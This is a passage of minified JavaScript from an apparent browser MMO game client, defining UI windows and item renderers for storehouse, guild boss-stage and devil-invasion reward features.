this.rolegroup:this._memberVo.roleId!=r.ActorCC.actorID&&win.open(h.StardomainMemberInfoWin,this._memberVo)}},e.prototype.dataChanged=function(){this.skin&&(this._memberVo=this.data,this._memberVo?(this.rolegroup.visible=!0,this.nomember.visible=this.invite.visible=!1,this.position.visible=!0,this.showRole(this._memberVo),this.lab.visible=!1,this.position.source=1==this._memberVo.leaderStatus?"road_leader":"",this.grpPower.visible=!0,this.ePow.text=this._memberVo.power+""):(this.nomember.visible=this.invite.visible=!0,this.position.visible=!1,this.lab.visible=!0,this.rolegroup.visible=!1,this.grpPower.visible=!1))},e.prototype.showRole=function(t){if(t&&(this.eIcon.source="yuanhead"+t.job+t.sex,this.lb_lv.text=t.lv+"",this.eNameLab.text=t.playerName,this.eTitleGrp.visible=!!t.titleId,this.eTitleGrp.visible)){var e=s.GlobalConfig.TitleConf[t.titleId];this.eTitle.text=null===e||void 0===e?void 0:e.name,this.eTitle.textColor=a.ItemUtil.getQualityColor((null===e||void 0===e?void 0:e.rare)||0),this.updateTitleEff(e)}},e.prototype.updateTitleEff=function(t){return(null===t||void 0===t?void 0:t.eff)?(this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.effTopGrp.addChild(this.titleMc)),this.eTitle.visible=!1,this.effTopGrp.visible=!0,void this.titleMc.playFile(RES_DIR_EFF+t.eff,-1)):(this.titleMc&&this.effTopGrp.removeChild(this.titleMc),this.titleMc=null,this.effTopGrp.visible=!1,void(this.eTitle.visible=!0))},e}(n.BaseItemRender);e.StardomainRoomMemberItem=u,window.StardomainRoomMemberItem=u,__reflect(u.prototype,"StardomainRoomMemberItem",[]),window.StardomainRoomMemberItem=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StoreHouseWin=void 0;var n=i(19),o=i(1),s=i(57),a=i(4),r=i(6),l=i(40),h=i(38),u=i(2),p=i(27),d=i(508),c=i(382),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ItemHouseSkin",e.oldIndex=-1,e.oldStoreIndex=-1,e.isLook=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eListBag.itemRenderer=d.StoreHouseItem,this.eListBag.dataProvider=this.eListBagArr=new eui.ArrayCollection,this.eListStore.itemRenderer=d.StoreHouseItem,this.eListStore.dataProvider=this.eListStoreArr=new eui.ArrayCollection},e.prototype.addDisplay=function(){observe(this,this.updateBag,r.BagCT.ins().postItemChange),observe(this,this.setBagCount,r.BagCT.ins().postBagVolAdd),observe(this,this.updateBag,r.BagCT.ins().postItemAdd),observe(this,this.updateBag,r.BagCT.ins().postItemDel),observe(this,this.updateBag,h.EquipCT.ins().sendEquipLock),observe(this,this.updateBag,r.BagCT.ins().postItemCoolDown),r.BagCT.ins().sendBagCellAdd(1),this.addTouchEvent(this.eAddBtnBag,this.onClick),this.addChangeEvent(this.eTabBag,this.onTabTouch),this.eListBag.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onClickListBag,this),this.setBagData(0),this.eTabBag.selectedIndex=0,observe(this,this.updateStore,c.StoreHouseCT.ins().patchBagNum),observe(this,this.updateStore,r.BagCT.ins().postItemAdd),observe(this,this.updateStore,r.BagCT.ins().postItemDel),this.isLook=!1,this.addChangeEvent(this.eTabStore,this.onTabTouchStore),this.addTouchEvent(this.checkBoxLook,this.onTouch),this.addTouchEvent(this.btnTidy,this.onClick),this.eListStore.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onClickListStore,this),this.eTabStore.selectedIndex=0,this.setStoreData(0),this.checkBoxLook.selected=this.isLook,this.updateStore()},e.prototype.setBagData=function(t){void 0===t&&(t=1);var e=[],i=[],n=[],o=[];switch(t){case 0:e=r.BagCT.ins().getBagGoodsBySort(0),i=r.BagCT.ins().getBagGoodsBySort(2),n=r.BagCT.ins().getBagGoodsBySort(3),o=r.BagCT.ins().getBagSortQualityEquips(5,0,1),o.sort(r.BagCT.ins().sort3);break;case 1:e=r.BagCT.ins().getBagGoodsBySort(0),i=r.BagCT.ins().getBagGoodsBySort(2),n=r.BagCT.ins().getBagGoodsBySort(3);break;case 2:o=r.BagCT.ins().getBagSortQualityEquips(5,0,1),o.sort(r.BagCT.ins().sort3)}var s=n.concat(i,e,o);this.eListBagArr.replaceAll(s),this.oldIndex!=t&&(this.oldIndex=t),this.setBagCount()},e.prototype.setBagCount=function(){this.eItemCountBag.text=r.BagCT.ins().getBagItemNum(1)+r.BagCT.ins().getBagItemNum(0)+"/"+r.BagCT.ins().getMaxBagRoom()},e.prototype.updateBag=function(){this.setBagData(this.oldIndex)},e.prototype.onTabTouch=function(){this.oldIndex!=this.eTabBag.selectedIndex&&this.setBagData(this.eTabBag.selectedIndex)},e.prototype.onClick=function(t){switch(t.target){case this.eAddBtnBag:r.BagCT.ins().goldLastTime||r.BagCT.ins().payLastTime||r.BagCT.ins().adLastTime?win.open("BagAddCellWin")&&win.open("StoreHouseWin"):u.TipsCT.ins().showTips(gettext("背包扩容已上限"));break;case this.btnTidy:c.StoreHouseCT.ins().sendTidyStoreHouse()}},e.prototype.setStoreData=function(t){void 0===t&&(t=1);var e=[];switch(t){case 0:e=c.StoreHouseCT.ins().getItemsByType(s.STORE_SUB_TYPE.All)||[];for(var i=c.StoreHouseCT.ins().getEmptyNum()||0,n=0;i>n;n++){var o=new l.ItemData;e.push(o)}for(var a=c.StoreHouseCT.ins().getLockNum()||0,n=0;a>n;n++){var o=new l.ItemData;o.storeHouselock=!0,e.push(o)}break;case 1:e=c.StoreHouseCT.ins().getItemsByType(s.STORE_SUB_TYPE.Item)||[];break;case 2:e=c.StoreHouseCT.ins().getItemsByType(s.STORE_SUB_TYPE.Equip)||[]}this.eListStoreArr.replaceAll(e),this.oldStoreIndex!=t&&(this.oldStoreIndex=t)},e.prototype.onTabTouchStore=function(){this.oldStoreIndex!=this.eTabStore.selectedIndex&&this.setStoreData(this.eTabStore.selectedIndex)},e.prototype.updateStore=function(){this.setStoreData(this.oldStoreIndex),this.setStoreCount()},e.prototype.onTouch=function(t){switch(t.currentTarget){case this.checkBoxLook:this.isLook=!this.isLook}},e.prototype.onClickListBag=function(){var t=this.eListBag.selectedItem;if(t)return t.endTime>0?void u.TipsCT.ins().showTips(gettext("限时道具不能放进仓库！")):this.isLook?void n.GlobalFun.showDetail(t.itemConfig,t):c.StoreHouseCT.ins().isMax()?void u.TipsCT.ins().showTips(gettext("仓库剩余空间不足")):void c.StoreHouseCT.ins().sendStoreOrTakeOut(0,t.handle)},e.prototype.onClickListStore=function(){var t=this.eListStore.selectedItem;if(t){if(t.storeHouselock)return void this.unlockItem();if(t.handle||t.storeHouselock)return this.isLook?void n.GlobalFun.showDetail(t.itemConfig,t):r.BagCT.ins().getAllSurplusCount(1)<0?(u.TipsCT.ins().showTips(gettext("背包已满")),!1):void c.StoreHouseCT.ins().sendStoreOrTakeOut(1,t.handle)}},e.prototype.setStoreCount=function(){var t=c.StoreHouseCT.ins().getItemsByType(s.STORE_SUB_TYPE.All)||[];this.eItemCount.text=t.length+"/"+c.StoreHouseCT.ins().getOpenNum()},e.prototype.unlockItem=function(){var t=c.StoreHouseCT.ins().getOpenCost(),e=1,i=gettext("是否消耗{0}元宝解锁{1}个仓库格子",t,e);p.WarnWin.show(i,function(){if(a.ActorCC.yb<t){var i=gettext("元宝不足");return void u.TipsCT.ins().showTips(i)}c.StoreHouseCT.ins().sendExpandStoreHouse(e)},this)},__decorate([delayCall(100)],e.prototype,"updateBag",null),e}(o.BaseView);e.StoreHouseWin=f,window.StoreHouseWin=f,__reflect(f.prototype,"StoreHouseWin",[]),window.StoreHouseWin=f},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DevilInvadeWin=void 0;var n=i(1),o=i(509),s=i(0),a=i(12),r=i(15),l=i(2),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DevildomSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onTouch)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.updateRed(),t[0]?(this.lastSelect=t[0],this.selectedIndex(this.lastSelect)):this.lastSelect=0,this.viewStack.selectedIndex=this.lastSelect},e.prototype.onTouch=function(t){switch(t.target){case this.seeRule:win.open("CommonHelpWin",s.GlobalConfig.HelpInfoConfig[38].text)}},e.prototype.selectedIndex=function(t){void 0!=this.lastSelect&&this.viewStack.getElementAt(this.lastSelect).close&&this.viewStack.getElementAt(this.lastSelect).close(),this.lastSelect=t,this.viewStack.getElementAt(this.lastSelect).open&&(0==this.lastSelect?this.viewStack.getElementAt(this.lastSelect).open(o.DevildomBossModel.ins().getCurFbIndex()):this.viewStack.getElementAt(this.lastSelect).open())},e.prototype.updateRed=function(){},e.openCheck=function(){var t=a.OpenSystem.ins().checkSysOpen(r.SystemType.DevilBoss);return t||l.TipsCT.ins().showTips(a.OpenSystem.ins().getNoOpenTips(r.SystemType.DevilBoss)),t},e}(n.BaseView);e.DevilInvadeWin=h,window.DevilInvadeWin=h,__reflect(h.prototype,"DevilInvadeWin",[]),window.DevilInvadeWin=h},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildSoulsLandPanel=void 0;var n=i(1),o=i(0),s=i(15),a=i(76),r=i(28),l=i(12),h=i(2),u=i(94),p=i(183),d=i(1206),c=i(1209),f=i(1210),g=function(t){function e(){var e=t.call(this)||this;return e.monsterItemArr=[],e._sn_="GuildSoulsLandSkin",e.curStage=1,e.maxStage=1,e.oldStage=1,e}return __extends(e,t),e.prototype.skinComplete=function(){u.GuildSoulsLandCT.ins().sendInit(u.GuildSoulsLandCT.ins().cur),this.maxStage=Object.keys(o.GlobalConfig.GuildAllSoulLandBossInfoConfig).length},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onTap),observe(this,this.updateView,u.GuildSoulsLandCT.ins().postInit),observe(this,this.updateMc,u.GuildSoulsLandCT.ins().poststate),observe(this,this.onPassStage,u.GuildSoulsLandCT.ins().postupdatePass),observe(this,this.updateMc,u.GuildSoulsLandCT.ins().postFocusMonster),observe(this,this.updateMc,u.GuildSoulsLandCT.ins().postGetMonsterChange),observe(this,this.updateChallenge,u.GuildSoulsLandCT.ins().postSweep),observe(this,this.updateRedPoint,u.GuildSoulsLandCT.ins().postupdatePass,u.GuildSoulsLandCT.ins().postSweep,u.GuildSoulsLandCT.ins().postRewardInfo,u.GuildSoulsLandCT.ins().postInit),this.eScroller.addEventListener(egret.Event.RESIZE,this.initScroll,this),this.curStage=u.GuildSoulsLandCT.ins().cur,this.onPassStage(),this.initScroll(),this.updateView()},e.prototype.initScroll=function(){this.eScroller.viewport.scrollH=((this.mapGrp.width||1407)-this.eScroller.width)/2},e.prototype.onPassStage=function(){this.curStage<1&&(this.curStage=1),this.curStage>this.maxStage&&(this.curStage=this.maxStage),this.initStageView(),this.updateRedPoint(),this.updateChallenge()},e.prototype.updateView=function(){this.updateMc(),this.updateChallenge(),this.updatePageBtn()},e.prototype.updateChallenge=function(){var t=u.GuildSoulsLandCT.ins();this.sweepGrp.visible=!1,1==t.open&&t.openTime>0?t.isAllPass()?(this.times.text=gettext("已通关最高关卡"),this.sweepGrp.visible=!0,this.sweepTimes.text=gettext("剩余扫荡次数：{0}",t.challenge+"/"+u.GuildSoulsLandCT.MAX_CHALLENGE)):this.times.text=gettext("剩余挑战次数：{0}",t.challenge+"/"+u.GuildSoulsLandCT.MAX_CHALLENGE):0==t.open&&t.openTime>0?this.times.text=gettext("已结算"):this.times.text=""},e.prototype.updatePageBtn=function(){this.btnLeft.enabled=this.curStage>1,this.btnRight.enabled=this.curStage<u.GuildSoulsLandCT.ins().cur&&this.curStage<this.maxStage},e.prototype.initStageView=function(){u.GuildSoulsLandCT.ins().initMonsterList(this.curStage),this.floor.source="SoulsLand_"+this.curStage,this.clearBossMCs();var t=u.GuildSoulsLandCT.ins().monsterInfoDic[this.curStage];if(t){for(var e in t){var i=t[e],n=void 0;this.monsterItemArr[e]||(i.type==u.GuildSoulsMonType.mon?this.monsterItemArr[e]=new c.GuildSoulsMonsterItem2:i.type==u.GuildSoulsMonType.JYMon?this.monsterItemArr[e]=new d.GuildSoulsMonsterItem:this.monsterItemArr[e]=new d.GuildSoulsMonsterItem),n=this.monsterItemArr[e],n.data=i,n.x=i.x,n.y=i.y,this.eMCGroup.addChild(n)}this.updateView()}},e.prototype.updateRedPoint=function(){this.btnDesc.eRp&&(this.btnDesc.eRp.visible=p.GuildSoulsRedPoint.ins().checkRewardRed())},e.prototype.updateMc=function(){for(var t=0,e=this.monsterItemArr;t<e.length;t++){var i=e[t];i.updateView()}},e.prototype.clearBossMCs=function(){for(var t in this.monsterItemArr){var e=this.monsterItemArr[t];e.clear()}this.monsterItemArr=[]},e.prototype.onTap=function(t){var e;switch(t.target){case this.help:win.open(a.CommonHelpWin,(null===(e=o.GlobalConfig.HelpInfoConfig[335])||void 0===e?void 0:e.text)||"");break;case this.btnDesc:win.open(f.GuildrewardsWin);break;case this.btnSweep:if(u.GuildSoulsLandCT.ins().challenge<=0)return void h.TipsCT.ins().showTips(gettext("次数不足，明日恢复次数"));u.GuildSoulsLandCT.ins().sendSweep();break;case this.btnLeft:this.curStage--,this.curStage<1&&(this.curStage=1),u.GuildSoulsLandCT.ins().sendInit(this.curStage),this.initStageView();break;case this.btnRight:this.curStage++,this.curStage>this.maxStage&&(this.curStage=this.maxStage),u.GuildSoulsLandCT.ins().sendInit(this.curStage),this.initStageView()}},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];Timer.stopAll(this),this.skin&&(this.clearBossMCs(),this.eScroller.removeEventListener(egret.Event.RESIZE,this.initScroll,this))},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=l.OpenSystem.ins().checkSysOpen(s.SystemType.GUILD_SOUL_LAND);i||h.TipsCT.ins().showTips(l.OpenSystem.ins().getNoOpenTips(s.SystemType.GUILD_SOUL_LAND));var n=u.GuildSoulsLandCT.ins().open;return n&&r.Guild.ins().guildID||h.TipsCT.ins().showTips(gettext("活动未开启")),i&&n},e}(n.BaseView);e.GuildSoulsLandPanel=g,window.GuildSoulsLandPanel=g,__reflect(g.prototype,"GuildSoulsLandPanel",[]),window.GuildSoulsLandPanel=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildSoulsMonsterItem=void 0;var n=i(94),o=i(0),s=i(16),a=i(3),r=i(510),l=i(2),h=function(t){function e(){var e=t.call(this)||this;return e.isDead=!1,e._sn_="GuildSoulsLandMonsterItem",e}return __extends(e,t),e.prototype.skinComplete=function(){observe(this,this.updateView,n.GuildSoulsLandCT.ins().postGetMonsterChange),this.addTouchEvent(this,this.onClick),this.dataChanged()},e.prototype.dataChanged=function(){this.info=this.data,this.info&&this.updateView()},e.prototype.updateView=function(){if(this.info){var t=o.GlobalConfig.MonstersConfig[this.info.monsterId];if(t){this.info.killer?this.des.text=gettext("击杀者：")+this.info.killer:this.des.text=t.name;var e=this.info.stage>n.GuildSoulsLandCT.ins().cur?t.hp:this.info.hp;this.bar.maximum=this.info.maxHp||t.hp,this.isDead=n.GuildSoulsLandCT.ins().cur>this.info.stage||!this.info.state||0>=e,this.isDead&&(e=0),this.bar.value=e,this.mark.visible=!!this.info.focus&&!this.isDead,this.info.focus&&(this.marknum.text=this.info.focus.toString()),this.monpic.source="img"+(null===t||void 0===t?void 0:t.head)+"_png"||!1,this.dead.visible=this.isDead,this.monpic.visible=!this.isDead}}},e.prototype.onClick=function(t){if(n.GuildSoulsLandCT.ins().open){if(!this.isDead)return n.GuildSoulsLandCT.ins().cur<this.info.stage?void l.TipsCT.ins().showTips(gettext("请先通关前面关卡")):void win.open(r.GuildSoulsChooseWin,this.info);l.TipsCT.ins().showTips(gettext("怪物已死亡"))}else l.TipsCT.ins().showTips(gettext("已结算，期待下期比赛"))},e.prototype.clear=function(){s.DisplayUtils.removeFromParent(this)},e}(a.BaseItemRender);e.GuildSoulsMonsterItem=h,window.GuildSoulsMonsterItem=h,__reflect(h.prototype,"GuildSoulsMonsterItem",[]),window.GuildSoulsMonsterItem=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildSoulsBuffItem=void 0;var n=i(3),o=i(0),s=i(94),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this.data){var t=o.GlobalConfig.AllSoulBuffLibConfig[this.data];t&&(this.icon.source=s.GuildSoulsBuffIcon[t.quality],this.txt.text=t.desc)}},e}(n.BaseItemRender);e.GuildSoulsBuffItem=a,window.GuildSoulsBuffItem=a,__reflect(a.prototype,"GuildSoulsBuffItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildSoulsBuffItem2=void 0;var n=i(3),o=i(0),s=i(94),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this.data){var t=o.GlobalConfig.AllSoulBuffLibConfig[this.data];t&&(this.icon.source=s.GuildSoulsBuffIcon[t.quality],this.txt.text=t.desc)}},e}(n.BaseItemRender);e.GuildSoulsBuffItem2=a,window.GuildSoulsBuffItem2=a,__reflect(a.prototype,"GuildSoulsBuffItem2",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildSoulsMonsterItem2=void 0;
var n=i(94),o=i(0),s=i(16),a=i(3),r=i(510),l=i(2),h=function(t){function e(){var e=t.call(this)||this;return e.isDead=!1,e._sn_="GuildSoulsLandMonsterItem2",e}return __extends(e,t),e.prototype.skinComplete=function(){observe(this,this.updateView,n.GuildSoulsLandCT.ins().postGetMonsterChange),this.addTouchEvent(this,this.onClick),this.dataChanged()},e.prototype.dataChanged=function(){this.info=this.data,this.info&&this.updateView()},e.prototype.updateView=function(){if(this.info){var t=o.GlobalConfig.MonstersConfig[this.info.monsterId];if(t){this.info.killer?this.des.text=gettext("击杀者：")+this.info.killer:this.des.text=t.name;var e=this.info.stage>n.GuildSoulsLandCT.ins().cur?t.hp:this.info.hp;this.bar.maximum=this.info.maxHp||t.hp,this.isDead=n.GuildSoulsLandCT.ins().cur>this.info.stage||!this.info.state||0>=e,this.isDead&&(e=0),this.bar.value=e,this.mark.visible=!!this.info.focus&&!this.isDead,this.info.focus&&(this.marknum.text=this.info.focus.toString()),this.monpic.source="monhead"+(null===t||void 0===t?void 0:t.head)+"_png"||!1,this.dead.visible=this.isDead,this.monpic.visible=this.monpic0.visible=!this.isDead}}},e.prototype.onClick=function(t){if(n.GuildSoulsLandCT.ins().open){if(!this.isDead)return n.GuildSoulsLandCT.ins().cur<this.info.stage?void l.TipsCT.ins().showTips(gettext("请先通关前面关卡")):void win.open(r.GuildSoulsChooseWin,this.info);l.TipsCT.ins().showTips(gettext("怪物已死亡"))}else l.TipsCT.ins().showTips(gettext("已结算，期待下期比赛"))},e.prototype.clear=function(){s.DisplayUtils.removeFromParent(this)},e}(a.BaseItemRender);e.GuildSoulsMonsterItem2=h,window.GuildSoulsMonsterItem2=h,__reflect(h.prototype,"GuildSoulsMonsterItem2",[]),window.GuildSoulsMonsterItem2=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildrewardsWin=void 0;var n=i(1),o=i(1211),s=i(0),a=i(94),r=i(1212),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildSoulsLandGuildrewards",e}return __extends(e,t),e.prototype.skinComplete=function(){this.reward_list.itemRenderer=o.GuildrewardsItem,observe(this,this.updateReward,a.GuildSoulsLandCT.ins().postRewardInfo),observe(this,this.updateLog,a.GuildSoulsLandCT.ins().postGetLog),this.addChangeEvent(this.Tab,this.updateTabShow),this.reward_list.dataProvider=this.eArc=new eui.ArrayCollection([]),this.log_list.itemRenderer=r.GuildSoulsLandLogItem,this.log_list.dataProvider=this.eLogArc=new eui.ArrayCollection([]),a.GuildSoulsLandCT.ins().sendRewardInfo(),a.GuildSoulsLandCT.ins().sendGetLog()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.updateTabShow()},e.prototype.updateTabShow=function(){this.award.visible=0==this.Tab.selectedIndex,this.situation.visible=1==this.Tab.selectedIndex,this.award.visible?this.updateReward():this.situation.visible&&this.updateLog()},e.prototype.updateReward=function(){var t=s.GlobalConfig.GuildAllSoulLandBossInfoConfig,e=[];for(var i in t)t[i][1]&&e.push(t[i][1]);this.eArc.replaceAll(e)},e.prototype.updateLog=function(){var t=a.GuildSoulsLandCT.ins().logInfoList;this.eLogArc.replaceAll(t)},e}(n.BaseView);e.GuildrewardsWin=l,window.GuildrewardsWin=l,__reflect(l.prototype,"GuildrewardsWin",[]),window.GuildrewardsWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildrewardsItem=void 0;var n=i(3),o=i(42),s=i(77),a=i(94),r=i(2),l=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.lstReward.itemRenderer=s.ItemBaseNoName,this.addTouchEvent(this.btnGet,this.onTap),this.dataChanged()},e.prototype.dataChanged=function(){this.updateView()},e.prototype.updateView=function(){var t=this.data;if(t)if(this.layer.text=gettext("第{0}层",o.StringUtils.NumberToChinese(t.id)),this.lstReward.dataProvider=new eui.ArrayCollection(t.passAwards),this.btnGet.eRp&&(this.btnGet.eRp.visible=a.GuildSoulsLandCT.ins().checkCanGetReward(t.id)),a.GuildSoulsLandCT.ins().isPassStage(t.id)){var e=a.GuildSoulsLandCT.ins().rewardInfo;(e>>t.id-1&1)>0?(this.btnGet.label=gettext("已领取"),this.btnGet.enabled=!1):(this.btnGet.label=gettext("领取"),this.btnGet.enabled=!0)}else this.btnGet.label=gettext("未通关"),this.btnGet.enabled=!1},e.prototype.onTap=function(){var t=this.data;if(t)return a.GuildSoulsLandCT.ins().isPassStage(t.id)?void a.GuildSoulsLandCT.ins().sendGetStageReward(t.id):void r.TipsCT.ins().showTips(gettext("请先通关"))},e}(n.BaseItemRender);e.GuildrewardsItem=l,window.GuildrewardsItem=l,__reflect(l.prototype,"GuildrewardsItem",[]),window.GuildrewardsItem=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildSoulsLandLogItem=void 0;var n=i(5),o=i(3),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){this.lb_log.textFlow=n.TextFlowMaker.generateTextFlow1(this.data)},e}(o.BaseItemRender);e.GuildSoulsLandLogItem=s,window.GuildSoulsLandLogItem=s,__reflect(s.prototype,"GuildSoulsLandLogItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildSoulsLandResultWin=void 0;var n=i(1),o=i(4),s=i(32),a=i(251),r=i(20),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamFbResultSkin",e.defaultRect=!1,e._result=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.listChallenger.itemRenderer=a.ChallengerHeadItemRender;var t={roleName:o.ActorCC.myName,job:o.ActorCC.jobId};this.listChallenger.dataProvider=new eui.ArrayCollection([t]),this.currentState="soulsLand"},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.changeScene,Ts.enterScene),this._result=t[0],this.addTouchEvent(this,this.onTouch),this.update()},e.prototype.removeDisplay=function(){},e.prototype.update=function(){return this.bg.source=this._result?"teamFb_win_png":"teamFb_lose_png",this.lostTxt.text=this._result?gettext("挑战成功"):gettext("挑战失败"),this.win.visible=this._result,this.defeat.visible=!this._result,this._result?(this._exitTime=5,Timer.start(1e3,0,this.repeate,this),void this.repeate()):void(this.closeBtn.label=gettext("退出"))},e.prototype.onTouch=function(t){switch(t.target){case this.closeBtn:this.exitFb()}},e.prototype.repeate=function(){return this.closeBtn.label=gettext("退出")+"("+this._exitTime+"s)",this._exitTime<=0?(Timer.stopAll(this),void this.exitFb()):void this._exitTime--},e.prototype.exitFb=function(){r.GameMap.fbType==s.FbCT.FB_TYPE_SOULS&&send(Ts.exitFB),win.close(this)},e.prototype.changeScene=function(){r.GameMap.fbType!=s.FbCT.FB_TYPE_SOULS&&win.close(this)},e}(n.BaseView);e.GuildSoulsLandResultWin=l,window.GuildSoulsLandResultWin=l,__reflect(l.prototype,"GuildSoulsLandResultWin",[]),window.GuildSoulsLandResultWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DevildomBelongAwardWin=void 0;var n=i(1),o=i(11),s=i(114),a=i(0),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="KFInvasionBelongSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.saleReward0.itemRenderer=o.ItemBase,this.belongReward0.itemRenderer=o.ItemBase},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.BG,this.onCloseWin),this.addTouchEvent(this.tipGroup1,this.onCloseWin),t&&void 0!=t&&0!=t.length?(this.belongReward0.dataProvider=new eui.ArrayCollection(s.KFBossSys.ins().getBossShowAward(a.GlobalConfig.DevilBossBase.mzbelongAwards)),this.saleReward0.dataProvider=new eui.ArrayCollection(s.KFBossSys.ins().getBossShowAward(a.GlobalConfig.DevilBossBase.mzbelongSaleAwards))):(this.belongReward0.dataProvider=new eui.ArrayCollection(s.KFBossSys.ins().getBossShowAward(a.GlobalConfig.DevilBossBase.belongAwards)),this.saleReward0.dataProvider=new eui.ArrayCollection(s.KFBossSys.ins().getBossShowAward(a.GlobalConfig.DevilBossBase.belongSaleAwards)))},e.prototype.onCloseWin=function(){win.close(this)},e}(n.BaseView);e.DevildomBelongAwardWin=r,window.DevildomBelongAwardWin=r,__reflect(r.prototype,"DevildomBelongAwardWin",[]),window.DevildomBelongAwardWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DevildomBossAwardWin=void 0;var n=i(1),o=i(11),s=i(114),a=i(0),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="KFInvasionJiangLiTishiSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.belongReward1.itemRenderer=o.ItemBase,this.saleReward1.itemRenderer=o.ItemBase,this.belongReward0.itemRenderer=o.ItemBase,this.saleReward0.itemRenderer=o.ItemBase},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.bgClose,this.onCloseWin),this.addTouchEvent(this.giveUp,this.onCloseWin),this.belongReward1.dataProvider=new eui.ArrayCollection(s.KFBossSys.ins().getBossShowAward(a.GlobalConfig.DevilBossBase.belongAwards)),this.saleReward1.dataProvider=new eui.ArrayCollection(s.KFBossSys.ins().getBossShowAward(a.GlobalConfig.DevilBossBase.belongSaleAwards)),this.belongReward0.dataProvider=new eui.ArrayCollection(s.KFBossSys.ins().getBossShowAward(a.GlobalConfig.DevilBossBase.partAwards)),this.saleReward0.dataProvider=new eui.ArrayCollection(s.KFBossSys.ins().getBossShowAward(a.GlobalConfig.DevilBossBase.partSaleAwards))},e.prototype.onCloseWin=function(){win.close(this)},e}(n.BaseView);e.DevildomBossAwardWin=r,window.DevildomBossAwardWin=r,__reflect(r.prototype,"DevildomBossAwardWin",[]),window.DevildomBossAwardWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DevildomPartAwardWin=void 0;var n=i(1),o=i(11),s=i(114),a=i(0),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="KFInvasionPartSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.saleReward.itemRenderer=o.ItemBase,this.belongReward.itemRenderer=o.ItemBase},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];t&&void 0!=t&&0!=t.length?(this.belongReward.dataProvider=new eui.ArrayCollection(s.KFBossSys.ins().getBossShowAward(a.GlobalConfig.DevilBossBase.mzpartAwards)),this.saleReward.dataProvider=new eui.ArrayCollection(s.KFBossSys.ins().getBossShowAward(a.GlobalConfig.DevilBossBase.mzpartSaleAwards))):(this.belongReward.dataProvider=new eui.ArrayCollection(s.KFBossSys.ins().getBossShowAward(a.GlobalConfig.DevilBossBase.partAwards)),this.saleReward.dataProvider=new eui.ArrayCollection(s.KFBossSys.ins().getBossShowAward(a.GlobalConfig.DevilBossBase.partSaleAwards)))},e}(n.BaseView);e.DevildomPartAwardWin=r,window.DevildomPartAwardWin=r,__reflect(r.prototype,"DevildomPartAwardWin",[]),window.DevildomPartAwardWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DevildomResultWin=void 0;var n=i(5),o=i(1),s=i(37),a=i(11),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="KFInvasionResultSkin",e.quitTime=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.saleList.itemRenderer=a.ItemBase,this.rewardList.itemRenderer=a.ItemBase},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.closeBtn,this.onCloseWin);var 